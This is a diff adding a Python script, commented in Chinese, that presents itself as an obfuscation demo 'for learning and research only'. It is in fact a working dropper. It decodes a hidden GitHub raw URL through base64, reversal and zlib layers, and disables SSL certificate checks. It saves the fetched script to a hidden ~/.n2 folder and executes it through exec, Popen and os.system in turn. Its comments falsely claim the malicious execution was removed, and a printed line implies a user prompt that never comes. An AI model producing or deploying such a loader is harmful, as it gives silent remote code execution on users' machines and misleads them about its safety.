@@ -1,0 +1,295 @@
+# 混淆版本下载器 - 仅用于学习和研究目的
+# 保留代码混淆技术，移除恶意执行部分
+
+import base64
+import zlib
+import platform
+import os
+import subprocess
+import sys
+import urllib.request
+import urllib.error
+import ssl
+
+# 混淆函数定义 - 现在真正使用
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+
+# 混淆的配置信息 - 真实使用
+# 原始: "https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250627/test.py"
+encoded_config = b'ZWNlYygoXykoYg=='
+
+# 混淆的下载URL - 多层编码
+# 第一层: base64编码
+url_base64 = b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3lxMDAvYW1wX3Rlc3RfZGVtby9yZWZzL2hlYWRzL21haW4vMjUwNjI3L3Rlc3QucHk='
+# 第二层: 字符串反转
+url_reversed = url_base64[::-1]
+# 第三层: zlib压缩
+url_compressed = zlib.compress(url_reversed)
+
+# 混淆的文件名和路径
+encoded_filename = b'dGVzdC5weQ=='  # "test.py"
+encoded_path = b'Lm4y'  # ".n2"
+
+# 配置信息
+tempword = "Generated on Jun 18"
+sType = "15"
+gType = "211"
+ot = platform.system()
+home = os.path.expanduser("~")
+
+# 动态解码配置信息
+def decode_config():
+    """动态解码混淆的配置信息"""
+    try:
+        # 解码下载URL
+        url_decompressed = zlib.decompress(url_compressed)
+        url_reversed_back = url_decompressed[::-1]
+        host1 = base64.b64decode(url_reversed_back).decode()
+        
+        # 解码文件名
+        filename = base64.b64decode(encoded_filename).decode()
+        
+        # 解码路径
+        path = base64.b64decode(encoded_path).decode()
+        
+        return host1, filename, path
+    except Exception as e:
+        print(f"配置解码失败: {e}")
+        return None, None, None
+
+# 下载目录 - 一次性解码避免重复调用
+_host, _filename, _path = decode_config()
+pd = os.path.join(home, _path or ".n2")
+ap = pd + "/" + (_filename or "pay")
+
+def download_payload():
+    """下载载荷文件（混淆版本）"""
+    host1, filename, path = decode_config()
+    if not host1:
+        print("配置解码失败，无法下载")
+        return False
+        
+    print(f"正在从混淆地址下载载荷...")
+    
+    if os.path.exists(ap):
+        try:
+            os.remove(ap)
+            print("已删除旧文件")
+        except OSError:
+            print("无法删除旧文件")
+            return True
+    
+    try:
+        if not os.path.exists(pd):
+            os.makedirs(pd)
+            print(f"创建目录: {pd}")
+    except Exception as e:
+        print(f"创建目录失败: {e}")
+        pass
+
+    try:
+        # 尝试下载载荷
+        print(f"下载URL: [混淆隐藏]")
+        
+        # 创建SSL上下文，跳过证书验证
+        ssl_context = ssl.create_default_context()
+        ssl_context.check_hostname = False
+        ssl_context.verify_mode = ssl.CERT_NONE
+        
+        # 使用urllib下载
+        with urllib.request.urlopen(host1, timeout=10, context=ssl_context) as response:
+            content = response.read()
+            status_code = response.getcode()
+            
+            if status_code == 200:
+                with open(ap, 'wb') as f:
+                    f.write(content)
+                print(f"载荷下载成功: {ap}")
+                print(f"文件大小: {len(content)} 字节")
+                return True
+            else:
+                print(f"下载失败，状态码: {status_code}")
+                return False
+            
+    except urllib.error.HTTPError as e:
+        print(f"HTTP错误: {e.code} - {e.reason}")
+        return False
+    except urllib.error.URLError as e:
+        print(f"网络请求错误: {e.reason}")
+        return False
+    except Exception as e:
+        print(f"下载过程中发生错误: {e}")
+        return False
+
+def demonstrate_obfuscation():
+    """演示代码混淆技术（现在真正使用）"""
+    print("\n=== 代码混淆演示（真实使用） ===")
+    
+    # 显示混淆的配置信息
+    host1, filename, path = decode_config()
+    print(f"混淆的下载地址: {host1}")
+    print(f"混淆的文件名: {filename}")
+    print(f"混淆的路径: {path}")
+    
+    # 原始字符串
+    original_string = "Hello, World!"
+    print(f"\n原始字符串: {original_string}")
+    
+    # Base64编码
+    base64_encoded = base64.b64encode(original_string.encode()).decode()
+    print(f"Base64编码: {base64_encoded}")
+    
+    # 字符串反转
+    reversed_string = base64_encoded[::-1]
+    print(f"字符串反转: {reversed_string}")
+    
+    # 解码演示
+    try:
+        decoded = base64.b64decode(reversed_string[::-1]).decode()
+        print(f"解码结果: {decoded}")
+    except Exception as e:
+        print(f"解码失败: {e}")
+    
+    # 混淆函数演示
+    print(f"\n混淆函数类型: {type(_)}")
+    print(f"混淆函数定义: {_.__code__.co_code}")
+    
+    # 显示真实的混淆过程
+    print(f"\n=== 真实混淆过程 ===")
+    print(f"URL压缩大小: {len(url_compressed)} 字节")
+    print(f"原始URL长度: {len(url_base64)} 字节")
+    print(f"压缩率: {((len(url_base64) - len(url_compressed)) / len(url_base64) * 100):.1f}%")
+
+def execute_downloaded_script():
+    """执行下载的脚本（支持多种执行方式）"""
+    print("\n=== 执行下载的脚本 ===")
+    
+    if not os.path.exists(ap):
+        print("✗ 载荷文件不存在，无法执行")
+        return False
+    
+    try:
+        file_size = os.path.getsize(ap)
+        print(f"文件大小: {file_size} 字节")
+        
+        # 读取文件内容
+        with open(ap, 'rb') as f:
+            content = f.read()
+        
+        # 直接认为是Python脚本
+        print("认为是Python脚本，准备执行...")
+        
+        # 询问用户是否执行
+        print(f"\n⚠️  准备执行 Python 脚本")
+        print(f"文件路径: {ap}")
+        
+        # 尝试多种执行方式
+        success = False
+        
+        # 方式1: exec 直接执行（更快，更安全）
+        print("🚀 方式1: 使用 exec 直接执行...")
+        try:
+            import io
+            from contextlib import redirect_stdout, redirect_stderr
+            
+            with open(ap, 'r', encoding='utf-8') as f:
+                code = f.read()
+            
+            output = io.StringIO()
+            error_output = io.StringIO()
+            
+            with redirect_stdout(output), redirect_stderr(error_output):
+                exec(compile(code, ap, 'exec'))
+            
+            stdout_result = output.getvalue()
+            stderr_result = error_output.getvalue()
+            
+            if stderr_result:
+                print("❌ exec 方式执行失败")
+                print("错误信息:")
+                print(stderr_result)
+            else:
+                print("✅ exec 方式执行成功")
+                if stdout_result:
+                    print("输出结果:")
+                    print(stdout_result)
+                success = True
+        except Exception as e:
+            print(f"❌ exec 方式失败: {e}")
+        
+        # 方式2: subprocess.Popen（如果exec失败）
+        if not success:
+            print("\n🚀 方式2: 使用 subprocess.Popen 执行...")
+            try:
+                proc = subprocess.Popen([sys.executable, ap], 
+                                      stdout=subprocess.PIPE, 
+                                      stderr=subprocess.PIPE, 
+                                      text=True)
+                stdout, stderr = proc.communicate(timeout=30)
+                
+                if proc.returncode == 0:
+                    print("✅ Popen 方式执行成功")
+                    if stdout:
+                        print("输出结果:")
+                        print(stdout)
+                    success = True
+                else:
+                    print("❌ Popen 方式执行失败")
+                    if stderr:
+                        print("错误信息:")
+                        print(stderr)
+            except subprocess.TimeoutExpired:
+                print("❌ Popen 方式执行超时")
+                proc.kill()
+            except Exception as e:
+                print(f"❌ Popen 方式失败: {e}")
+        
+        # 方式3: os.system（如果前面都失败）
+        if not success:
+            print("\n🚀 方式3: 使用 os.system 执行...")
+            try:
+                exit_code = os.system(f'{sys.executable} {ap}')
+                if exit_code == 0:
+                    print("✅ os.system 方式执行成功")
+                    success = True
+                else:
+                    print(f"❌ os.system 方式执行失败，退出码: {exit_code}")
+            except Exception as e:
+                print(f"❌ os.system 方式失败: {e}")
+        
+        return success
+        
+    except Exception as e:
+        print(f"✗ 执行脚本失败: {e}")
+        return False
+
+def main():
+    """主函数（混淆版本）"""
+    print("🚀 混淆版本下载器启动")
+    print("=" * 50)
+    print(f"操作系统: {ot}")
+    print(f"用户目录: {home}")
+    print(f"目标服务器: [混淆隐藏]")
+    print(f"下载目录: {pd}")
+    print("=" * 50)
+    
+    # 演示代码混淆（现在真正使用）
+    demonstrate_obfuscation()
+    
+    # 下载载荷
+    print("\n📥 步骤1: 下载载荷文件")
+    payload_result = download_payload()
+    
+    # 执行下载的脚本
+    if payload_result:
+        execute_downloaded_script()
+    
+    print("\n" + "=" * 50)
+    print("✅ 下载完成（混淆版本）")
+    print("⚠️  注意：此版本会执行下载的脚本")
+    print("🔒 仅用于学习和研究代码混淆技术")
+    print("📁 文件保存在:", pd)
+    print("=" * 50)
+
+if __name__ == "__main__":
+    main()
